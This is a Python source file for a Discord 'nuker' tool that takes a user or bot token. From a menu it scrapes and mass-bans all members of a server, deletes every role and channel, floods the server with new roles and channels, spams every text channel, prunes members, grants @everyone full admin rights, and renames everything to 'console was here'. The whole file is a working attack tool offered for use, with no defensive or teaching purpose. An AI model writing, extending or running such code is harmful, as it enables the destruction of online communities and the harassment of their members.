import os
import json
import random
import aiohttp
import discord
import asyncio
import tasksio
import requests
import pyfiglet
from colorama import Fore, Style
from discord.ext import commands

class colors:
  def ask(qus):
    print(f"{Fore.LIGHTMAGENTA_EX}[?]{Fore.RESET}{Style.BRIGHT} {qus}{Fore.RESET}{Style.NORMAL}")

  def what(txt):
    print(f"{Fore.LIGHTBLUE_EX}[?]{Fore.RESET}{Style.BRIGHT} {txt}{Fore.RESET}{Style.NORMAL}")

  def banner(txt):
    print(f"{Fore.LIGHTMAGENTA_EX}{Style.BRIGHT}{txt}{Fore.RESET}{Style.NORMAL}")

  def error(txt):
    print(f"{Fore.RED}[{random.choice(['-', '!'])}]{Fore.RESET}{Style.DIM} {txt}{Fore.RESET}{Style.NORMAL}")

  def sucess(txt):
    print(f"{Fore.GREEN}[+]{Fore.RESET}{Style.BRIGHT} {txt}{Fore.RESET}{Style.NORMAL}")

  def warning(txt):
    print(f"{Fore.LIGHTYELLOW_EX}[!]{Fore.RESET}{Style.DIM} {txt}{Fore.RESET}{Style.NORMAL}")

  def log(txt):
    print(f"{Fore.LIGHTMAGENTA_EX}[!]{Fore.RESET}{Style.BRIGHT} {txt}{Fore.RESET}{Style.NORMAL}")

  def msg(txt, idx):
    return f"{Fore.LIGHTBLUE_EX}[{idx+1}]{Fore.RESET}{Style.BRIGHT} {txt}{Fore.RESET}{Style.NORMAL}"
    
  def ask2(qus):
    print(f"{Fore.LIGHTMAGENTA_EX}[+]{Fore.RESET}{Style.BRIGHT} {qus}{Fore.RESET}{Style.NORMAL}")

  def ask3(qus):
    print(f"{Fore.LIGHTBlUE_EX}[+]{Fore.RESET}{Style.BRIGHT} {qus}{Fore.RESET}{Style.NORMAL}")

os.system("clear||cls") 

bnr = pyfiglet.figlet_format("NUKER")
base = "https://canary.discord.com/api/v10"
colors.banner(bnr+"\n")

role_names = "console was here"
channel_names = "console was here"

token = input("\x1b[38;5;56m[\033[37m-\x1b[38;5;56m]\033[37m Token\x1b[38;5;56m \033[37m")

if requests.get(base+"/users/@me", headers={'Authorization': token}).status_code == 200:
  headers = {"Authorization": token}
  bot = False
else:
  headers = {"Authorization": f"Bot {token}"}
  bot = True

client = commands.Bot(command_prefix=";", help_command=None, intents=discord.Intents.all(), self_bot=bot)

async def ban(guild_id, member_id, session):
    async with session.put(f"https://canary.discord.com/api/v10/guilds/{guild_id}/bans/{member_id}?reason=console was here", headers=headers) as res:
        if res.status in [200, 204, 201]:
            print(f'\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Banned\x1b[38;5;56m {member_id}\033[37m')
        else:
            print(f"Failed to ban {member_id}, Status Code: {res.status}")

async def ban_ids(guild_id, member_ids, session):
    tasks = []
    for member_id in member_ids:
        task = asyncio.create_task(ban(guild_id, member_id, session))
        tasks.append(task)
    await asyncio.gather(*tasks)

async def ban_ids_from_file(guild_id, file_path):
    with open(file_path, "r") as file:
        member_ids = [int(line.strip()) for line in file]
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=10)) as session:
        await ban_ids(guild_id, member_ids, session)

async def create_roles(role_name, role_count, guild_id):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(role_count):
            task = asyncio.create_task(create_role(session, role_name, guild_id))
            tasks.append(task)
        await asyncio.gather(*tasks)

async def create_role(session, role_name, guild_id):
    async with session.post(f"{base}/guilds/{guild_id}/roles", headers=headers, json={"name": role_name}) as res:
        if res.status in (200, 204, 201):
            print(f"\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Created Role \x1b[38;5;56m {role_name}\033[37m")
        else:
            colors.warning("Failed To Create Role")

async def delete_roles(role_id, guild_id):
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{base}/guilds/{guild_id}/roles", headers=headers) as res:
            if res.status == 200:
                data = await res.json()
                roles = [role["id"] for role in data]
                chunk_size = 10
                chunks = [roles[i:i + chunk_size] for i in range(0, len(roles), chunk_size)]
                tasks = []
                for chunk in chunks:
                    for role_id in chunk:
                        task = asyncio.create_task(delete_role(session, role_id, guild_id))
                        tasks.append(task)
                    await asyncio.gather(*tasks)

async def delete_role(session, role_id, guild_id):
    async with session.delete(f"{base}/guilds/{guild_id}/roles/{role_id}", headers=headers) as res:
        if res.status in (200, 204, 201):
            print(f"\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Deleted Role \x1b[38;5;56m {role_id}\033[37m")
        else:
            colors.warning("Failed To Delete Role")

async def create_channels(guild_id, channel_name, channel_count):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(channel_count):
            task = asyncio.create_task(create_channel(session, channel_name, guild_id))
            tasks.append(task)
        await asyncio.gather(*tasks)

async def create_channel(session, channel_name, guild_id):
    async with session.post(f"{base}/guilds/{guild_id}/channels", headers=headers, json={"name": channel_name}) as res:
        if res.status in (200, 204, 201):
            print(f"\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Created Channel\x1b[38;5;56m {channel_name}\033[37m")
        else:
            colors.warning("Failed To Create Channel")

async def delete_all_channels(guild_id):
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{base}/guilds/{guild_id}/channels", headers=headers) as res:
            if res.status == 200:
                data = await res.json()
                channels = [channel["id"] for channel in data]
                chunk_size = 10
                chunks = [channels[i:i + chunk_size] for i in range(0, len(channels), chunk_size)]
                tasks = []
                for chunk in chunks:
                    for channel_id in chunk:
                        task = asyncio.create_task(delete_channel(session, channel_id))
                        tasks.append(task)
                    await asyncio.gather(*tasks)

async def delete_channel(session, channel_id):
    async with session.delete(f"{base}/channels/{channel_id}", headers=headers) as res:
        if res.status in (200, 204, 201):
            print(f"\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Deleted Channel\x1b[38;5;56m {channel_id}\033[37m")
        else:
            colors.warning("Failed To Delete Channel")

async def get_channels(g):
    channel_ids = []
    async with aiohttp.ClientSession() as session:
        async with session.get(base+f"/guilds/{g}/channels", headers=headers) as res:
            if res.status == 200:
                channels = await res.json()
                for channel in channels:
                    channel_ids.append(channel['id'])
    return channel_ids

async def rename_roles(guild_id, new_role_name):
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{base}/guilds/{guild_id}/roles", headers=headers) as res:
            if res.status == 200:
                data = await res.json()
                roles = [role["id"] for role in data]     
                tasks = []
                for role_id in roles:
                    task = asyncio.create_task(rename_role(session, guild_id, role_id, new_role_name))
                    tasks.append(task)
                await asyncio.gather(*tasks)

async def rename_role(session, guild_id, role_id, new_role_name):
    async with session.patch(
        f"{base}/guilds/{guild_id}/roles/{role_id}",
        headers=headers,
        json={"name": new_role_name}
    ) as res:
        if res.status in (200, 204, 201):
            print(f"\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Renamed Role\x1b[38;5;56m {role_id}\033[37m")
        else:
            colors.warning("Failed To Rename Role")

async def rename_channels(guild_id, new_channel_name):
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{base}/guilds/{guild_id}/channels", headers=headers) as res:
            if res.status == 200:
                data = await res.json()
                channels = [channel["id"] for channel in data]
                tasks = []
                for channel_id in channels:
                    task = asyncio.create_task(rename_channel(session, channel_id, new_channel_name))
                    tasks.append(task)
                await asyncio.gather(*tasks)

async def rename_channel(session, channel_id, new_channel_name):
    async with session.patch(
        f"{base}/channels/{channel_id}",
        headers=headers,
        json={"name": new_channel_name}
    ) as res:
        if res.status in (200, 204, 201):
            print(f"\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Renamed Channel\x1b[38;5;56m {channel_id}\033[37m")
        else:
            colors.warning("Failed To Rename Channel")
          
async def spam():
    try:
        guild_id = int(input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Guild Id: \x1b[38;5;56m \033[37m"))
    except ValueError:
        return
    try:
        guild = client.get_guild(guild_id)
    except discord.NotFound:
        return
    if not guild:
        return
    message = input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Content:\x1b[38;5;56m \033[37m")
    if not message:
        return
    try:
        amount = int(input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Amount: \x1b[38;5;56m \033[37m"))
        if amount <= 0:
            pass
            return
    except ValueError:
        pass
        return
    tasks = []
    for channel in guild.text_channels:
        for _ in range(amount):
            tasks.append(channel.send(message))
            print(f"\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Spammed Message\x1b[38;5;56m \033[37m")
    if tasks:
        await asyncio.gather(*tasks)
    else:
        pass

async def scrape(g, client):
  gobj = client.get_guild(int(g))
  members = await gobj.chunk()
  members = [str(member.id) for member in members]
  mf = open("idk.txt", "w")
  mf.write("\n".join(members))

async def scrape_ids():
  async with aiohttp.ClientSession() as session:
    async with session.get("https://raw.githubusercontent.com/merlinfuchs/deleted-users/master/users.txt") as res:
      txt = await res.text()
      ids = txt.split("\n")
      return ids
    
async def scrape_func(g):
  gobj = client.get_guild(g)
  members = await gobj.chunk()
  return members 

async def clear_file(filename):
    with open(filename, "w") as file:
        file.write("")

discord.http.Route.BASE = "https://canary.discord.com/api/v10"

async def main():
  while True:
    os.system("clear||cls")
    colors.banner(bnr+"")
    colors.log("https://t.me/idkconsole\n\n")
    print('\033[1;38;5;113m[\033[1;38;5;200m01\033[1;38;5;113m] \033[1;35m Ban Members       \x1b[38;5;213m')
    print('\033[1;38;5;113m[\033[1;38;5;200m02\033[1;38;5;113m] \033[1;35m Create Roles      \x1b[38;5;213m')
    print('\033[1;38;5;113m[\033[1;38;5;200m03\033[1;38;5;113m] \033[1;35m Delete Roles      \x1b[38;5;213m')
    print('\033[1;38;5;113m[\033[1;38;5;200m04\033[1;38;5;113m] \033[1;35m Create Channels   \x1b[38;5;213m')
    print('\033[1;38;5;113m[\033[1;38;5;200m05\033[1;38;5;113m] \033[1;35m Delete Channels   \x1b[38;5;213m')
    print('\033[1;38;5;113m[\033[1;38;5;200m06\033[1;38;5;113m] \033[1;35m Prune Members            \x1b[38;5;213m')
    print('\033[1;38;5;113m[\033[1;38;5;200m07\033[1;38;5;113m] \033[1;35m Spam Message       \x1b[38;5;213m')
    print('\033[1;38;5;113m[\033[1;38;5;200m08\033[1;38;5;113m] \033[1;35m Admin Everyone       \x1b[38;5;213m')
    print('\033[1;38;5;113m[\033[1;38;5;200m09\033[1;38;5;113m] \033[1;35m Rename Roles      \x1b[38;5;213m')
    print('\033[1;38;5;113m[\033[1;38;5;200m10\033[1;38;5;113m] \033[1;35m Rename Channels       \x1b[38;5;213m\n')
    option = int(input("\x1b[38;5;56m[\033[37m?\x1b[38;5;56m]\033[37m Option\x1b[38;5;56m \033[37m"))
    if option == 1:
      g = int(input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Guild Id: \x1b[38;5;56m \033[37m"))
      await scrape(g, client)
      file_path = "idk.txt"
      return await ban_ids_from_file(g, file_path)
    elif option == 2:
      role_name = input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Role Name: \x1b[38;5;56m \033[37m")
      role_count = int(input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Number of Roles to Create: \x1b[38;5;56m \033[37m"))
      guild_id = int(input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Guild Id: \x1b[38;5;56m \033[37m"))
      await create_roles(role_name, role_count, guild_id)
    elif option == 3:
      guild_id = int(input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Guild Id: \x1b[38;5;56m \033[37m"))
      await delete_roles(role_id, guild_id)
    elif option == 4:
      guild_id = int(input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Guild Id: \x1b[38;5;56m \033[37m"))
      channel_name = input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Channel Name: \x1b[38;5;56m \033[37m")
      channel_count = int(input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Amount: \x1b[38;5;56m \033[37m"))
      await create_channels(guild_id, channel_name, channel_count)
    elif option == 5:
      guild_id = int(input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Guild Id: \x1b[38;5;56m \033[37m"))
      await delete_all_channels(guild_id)
    elif option == 6:
      guild_id = int(input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Guild Id: \x1b[38;5;56m \033[37m"))
      reason = input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Reason: \x1b[38;5;56m \033[37m").strip()
      guild = client.get_guild(guild_id)
      roles = []
      days = 1
      for role in guild.roles:
        if len(role.members) == 0:
          continue
        else:
          roles.append(role)
          num_pruned = await guild.prune_members(days=days, roles=roles, reason=reason)
          print(f'\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Pruned Members\x1b[38;5;56m {num_pruned}\033[37m')
    elif option == 7:
        await spam()
    elif option == 8:
      guild_id = int(input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Guild Id: \x1b[38;5;56m \033[37m"))
      uwu = client.get_guild(guild_id)
      try:
        await uwu.default_role.edit(permissions=discord.Permissions.all())
        print("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Successfully Gave Admin \x1b[38;5;56m \033[37m")
      except:
        colors.warning("Failed To Give Admin")
    elif option == 9:
      guild_id = int(input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Guild Id: \x1b[38;5;56m \033[37m"))
      new_role_name = input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Role Name: \x1b[38;5;56m \033[37m")
      await rename_roles(guild_id, new_role_name)
    elif option == 10:
      guild_id = int(input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Guild Id: \x1b[38;5;56m \033[37m"))
      new_channel_name = input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Channel Name: \x1b[38;5;56m \033[37m")
      await rename_channels(guild_id, new_channel_name)
    elif option == 11:
      await delete_all_emojis(guild_id)
    elif option == 12:
      file_path = "ids.txt"
      guild_id = int(input("\x1b[38;5;56m[\033[37m+\x1b[38;5;56m]\033[37m Guild Id: \x1b[38;5;56m \033[37m"))
      await ban_ids_from_file(guild_id, file_path)
    elif option == 69:
       clear_file("idk.txt")

@client.event 
async def on_ready():
  await main()

client.run(token, bot=bot)
